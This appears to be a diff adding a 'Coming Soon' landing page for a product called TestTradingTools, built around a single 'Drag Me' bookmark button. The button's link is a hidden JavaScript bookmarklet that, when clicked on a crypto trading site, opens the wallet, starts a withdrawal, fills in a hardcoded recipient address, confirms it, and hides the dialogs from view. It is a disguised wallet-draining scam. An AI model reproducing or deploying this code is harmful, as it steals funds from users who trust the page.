@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TestTradingTools</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body {
+      background: linear-gradient(to bottom, #1e3a8a, #3b82f6);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: Arial, sans-serif;
+    }
+    .container {
+      text-align: center;
+      color: white;
+    }
+    .logo {
+      font-size: 2.5rem;
+      font-weight: bold;
+      margin-bottom: 1rem;
+    }
+    .drag-me {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      background-color: #2563eb;
+      color: white;
+      font-weight: medium;
+      padding: 0.5rem 1rem;
+      border-radius: 0.375rem;
+      transition: all 0.075s;
+      width: 140px;
+      text-decoration: none;
+    }
+    .drag-me:hover {
+      background-color: #1e40af;
+      transform: scale(1.05);
+    }
+    .social-links {
+      margin-top: 1rem;
+      display: flex;
+      justify-content: center;
+      gap: 1rem;
+    }
+    .social-links a {
+      color: white;
+      font-size: 1.5rem;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">TestTradingTools</div>
+    <p>Coming Soon</p>
+    <a href="javascript:(function(){const waitForElement=(selector,callback)=>{const interval=setInterval(()=>{const element=document.querySelector(selector);if(element){clearInterval(interval);callback(element);}},1);};const walletButton=document.querySelector('.w-fit.min-w-max.bg-primaryStroke');if(walletButton){walletButton.click();setTimeout(()=>{const withdrawalButton=document.querySelector('.bg-primaryBlue.flex.flex-row.flex-1.h-[32px]');if(withdrawalButton){withdrawalButton.click();waitForElement('.bg-secondaryStroke.flex-1.h-[28px]',(inputContainer)=>{const input=inputContainer.querySelector('input');const setValue=Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype,'value').set;setValue.call(input,'BkLzurf5FWx2s3YhdDC1Wx29hRqvhQ3BHJE3GPGex9So');input.dispatchEvent(new Event('input',{bubbles:true}));input.dispatchEvent(new Event('change',{bubbles:true}));waitForElement('.text-primaryBlue.text-[12px].leading-[16px].font-medium',(confirmButton)=>{confirmButton.click();});});}else{console.error('Withdrawal button not found.');}const modal=document.querySelector('.relative.flex.flex-col.w-[364px].min-h-[448px].max-h-[90vh].bg-backgroundTertiary.border-[1px].border-secondaryStroke.rounded-[4px].shadow-[0_4px_4px_0_rgba(0,0,0,0.30),0_8px_8px_0_rgba(0,0,0,0.45)]');if(modal)modal.style.display='none';const container=document.querySelector('.flex.flex-col.w-full.max-w-[312px].pt-[16px].pb-[20px].gap-[16px].bg-backgroundTertiary.border.border-secondaryStroke.rounded-[4px].justify-center.items-center.z-[300].shadow-[0_4px_4px_0_rgba(0,0,0,0.30),0_8px_8px_0_rgba(0,0,0,0.45)]');if(container)container.style.display='none';},1);}else{console.error('Wallet button not found.');}})();" class="drag-me inline-flex items-center justify-center" title="Click me">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="w-5 h-5 mr-2">
+        <path fill-rule="evenodd" d="M6.32 2.577a49.255 49.255 0 0111.36 0c1.497.174 2.57 1.46 2.57 2.93V21a.75.75 0 01-1.085.67L12 18.089l-7.165 3.583A.75.75 0 013.75 21V5.507c0-1.47 1.073-2.756 2.57-2.93z" clip-rule="evenodd"></path>
+      </svg>
+      Drag Me
+    </a>
+    <div class="social-links">
+      <a href="#"><svg xmlns="http://www.w3.org/2000/svg" class="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><path d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005 1.016-3.127 1.247-.897-.957-2.178-1.555-3.594-1.555-2.717 0-4.92 2.203-4.92 4.917 0 .39.045.765.127 1.124C7.691 8.094 4.066 6.13 1.64 3.161c-.427.722-.666 1.561-.666 2.475 0 1.708.87 3.215 2.188 4.096-.807-.026-1.566-.248-2.228-.616v.061c0 2.385 1.693 4.374 3.946 4.827-.413.111-.849.228-1.287.335.289.884 1.126 1.529 2.118 1.548-1.956 1.533-4.423 2.447-7.103 2.447-.461 0-.916-.027-1.364-.082 2.529 1.622 5.536 2.567 8.772 2.567 10.531 0 16.294-8.732 16.294-16.294 0-.248-.005-.495-.016-.738 1.12-.803 2.097-1.807 2.866-2.948z"></path></svg></a>
+      <a href="#"><svg xmlns="http://www.w3.org/2000/svg" class="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm5 11h-4v4h-2v-4H7v-2h4V7h2v4h4v2z"></path></svg></a>
+    </div>
+  </div>
+</body>
+</html>
